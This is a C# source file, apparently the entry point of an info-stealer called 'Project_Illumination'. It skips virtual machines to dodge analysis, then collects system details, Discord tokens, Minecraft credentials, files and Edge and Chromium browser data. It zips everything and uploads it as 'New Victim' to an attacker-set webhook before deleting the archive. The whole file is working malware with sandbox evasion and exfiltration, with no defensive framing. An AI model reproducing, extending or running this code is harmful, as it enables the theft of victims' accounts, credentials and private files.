using Project_Illumination.Exploits;
using Project_Illumination.Exploits.Browsers;
using Project_Illumination.Exploits.Programs;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Threading;

namespace Project_Illumination
{
    internal class Program
    {
        // Add as many Webhooks as you want
        private static readonly string[] _WEBHOOKS = { "1", "2" };

        private static void Main(string[] args)
        {
            if (IsVM()) return;

            Directory.CreateDirectory(Paths.SAVE_PATH);
            var threads = new List<Thread>
            {
                new Thread(() =>
                {
                    new SystemInfo().Run();
                    new DiscordGrabber().Run();
                    new MinecraftStealer().Run();
                    new FileFinder().Run();
                })
            };

            IBrowser[] browsers = { new Edge(), new Chromium() };
            threads.AddRange(browsers.Select(browser => new Thread(browser.Run)));

            foreach (var t in threads) t.Start();
            foreach (var t in threads) t.Join();

            if (File.Exists($"{Paths.SAVE_PATH}.zip")) File.Delete($"{Paths.SAVE_PATH}.zip");

            ZipFile.CreateFromDirectory(Paths.SAVE_PATH, $"{Paths.SAVE_PATH}.zip");
            Directory.Delete(Paths.SAVE_PATH, true);

            using var httpClient = new HttpClient();
            using var form = new MultipartFormDataContent();
            var bytes = File.ReadAllBytes($"{Paths.SAVE_PATH}.zip");

            form.Add(new ByteArrayContent(bytes, 0, bytes.Length), "New Victim", $"{Paths.SAVE_PATH}.zip");
            httpClient.PostAsync(_WEBHOOKS[new Random().Next(_WEBHOOKS.Length)], form).Wait();

            File.Delete(Paths.SAVE_PATH + ".zip");
        }

        private static bool IsVM()
        {
            using var searcher = new System.Management.ManagementObjectSearcher("Select Manufacturer,Model from Win32_ComputerSystem");
            using var items = searcher.Get();
            foreach (var item in items)
            {
                var manufacturer = item["Manufacturer"].ToString().ToLower();
                if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                    || manufacturer.Contains("vmware")
                    || item["Model"].ToString() == "VirtualBox")
                {
                    return true;
                }
            }

            return false;
        }
    }
}
